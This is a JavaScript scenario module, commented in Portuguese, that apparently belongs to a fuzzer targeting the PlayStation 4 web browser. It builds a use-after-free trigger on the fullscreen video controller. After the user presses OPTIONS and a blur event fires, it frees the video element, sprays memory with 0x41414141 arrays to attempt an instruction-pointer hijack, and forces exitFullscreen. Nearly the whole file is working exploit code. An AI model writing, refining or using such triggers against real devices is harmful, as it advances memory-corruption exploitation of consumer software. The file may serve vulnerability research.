/**
 * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (O Gatilho OPTIONS)
 * Alvo: FullscreenVideoController::exitFullscreen() via Blur Event
 */

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE',
    category: 'Media',
    risk:     'CRITICAL',
    description: 'Usa o requestFullscreen padrão. Aguarda o usuário apertar OPTIONS (onblur) ' +
                 'para executar o free(), spray(), exitFullscreen() e teardown (500ms).',

    setup: async function() {
        this.container = document.createElement('div');
        document.body.appendChild(this.container);
        this.video = document.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        this.container.appendChild(this.video);

        // A nossa munição de Spray (0x41414141) para testar o PC/RIP hijack
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        // 1. Entra em fullscreen da forma que funcionava bem (DOM Standard)
        try {
            if (this.video.webkitRequestFullscreen) {
                this.video.webkitRequestFullscreen();
            }
        } catch(e) {}

        // 2. Trava a execução do fuzzer e arma a armadilha do OPTIONS
        await new Promise(resolve => {
            
            const blurHandler = () => {
                // Remove o listener para não disparar duas vezes
                window.removeEventListener('blur', blurHandler);

                try {
                    // A. FREE: Removemos o vídeo enquanto o sistema invoca o menu da PS4
                    this.video.remove();

                    // B. REUSE (SPRAY): Preenchemos o buraco deixado pelo player
                    this.spray = [];
                    for (let i = 0; i < 5000; i++) {
                        let arr = new Uint32Array(256);
                        arr.set(this.sprayPayload);
                        this.spray.push(arr);
                    }

                    // C. USE: Forçamos a saída. O controlador tentará ler o player morto!
                    if (document.webkitExitFullscreen) {
                        document.webkitExitFullscreen();
                    }

                    // D. TEARDOWN: A sua tática dos 500ms
                    // Se o exitFullscreen não crashou na hora, aniquilamos o DOM
                    // para forçar o recolhimento do lixo enquanto o C++ ainda processa.
                    setTimeout(() => {
                        try {
                            // Uso document.write em vez de location.reload() para 
                            // manter o fuzzer na mesma página se o crash falhar.
                            document.write('BOOM');
                            document.close();
                        } catch(e) {}
                        
                        resolve(); // Libera o fuzzer para continuar (se ainda estiver vivo!)
                    }, 500);

                } catch(e) {
                    resolve();
                }
            };

            // Armamos o gatilho: assim que você apertar OPTIONS, o blurHandler corre
            window.addEventListener('blur', blurHandler);
        });
    },

    probe: [
        s => s.video.duration,
        s => s.video.readyState,
        s => s.video.videoWidth,
        s => s.video.webkitDecodedFrameCount,
        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
    ],

    cleanup: function() {
        try { this.container.remove(); } catch(e) {}
        this.spray = null;
    }
};
